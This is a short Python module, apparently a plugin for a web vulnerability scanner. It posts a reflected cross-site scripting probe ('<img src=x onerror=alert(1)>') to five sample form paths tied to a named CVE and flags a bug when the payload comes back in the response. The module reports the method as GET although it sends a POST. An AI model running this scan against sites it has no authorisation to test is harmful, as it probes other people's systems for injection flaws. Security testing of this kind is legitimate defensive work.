#!/usr/bin/env python3

from libs import NewRequest as nq
from libs import post_data
from core import ShowMessage as show
from core import info,bad
from threading import Thread
from queue import Queue
from urllib.parse import urlparse,urljoin

q = Queue()

def add_path(url):
    paths = [
            "data/sample-register-form.php",
            "data/sample-login-form.php",
            "data/autosuggest-remote.php",
            "data/sample-forgotpassword-form.php",
            "data/login-form.php"
            ]
    urls = []
    for path in paths:
        urls.append(urljoin(url,path))
    return urls
def threader():
    while True:
        item = q.get()
        NEON_CVE(item)
        q.task_done()
def run(opts):
    for i in range(opts['threads']):
        p1 = Thread(target=threader)
        p1.daemon = True
        p1.start()
    for url in opts['url']:
        q.put(url)
    q.join()
def NEON_CVE(url):
    urls = add_path(url)
    for u in urls:
        r = nq.Post(u,post_data('q=<img src=x onerror=alert(1)>'))
        if '<img src=x onerror=alert(1)>'.encode('utf-8') in r.content:
            show.bug(bug='Cross-site scripting',payload='<img src=x onerror=alert(1)>',method='GET',parameter='q',target=u,link='q=<img src=x onerror=alert(1)>')
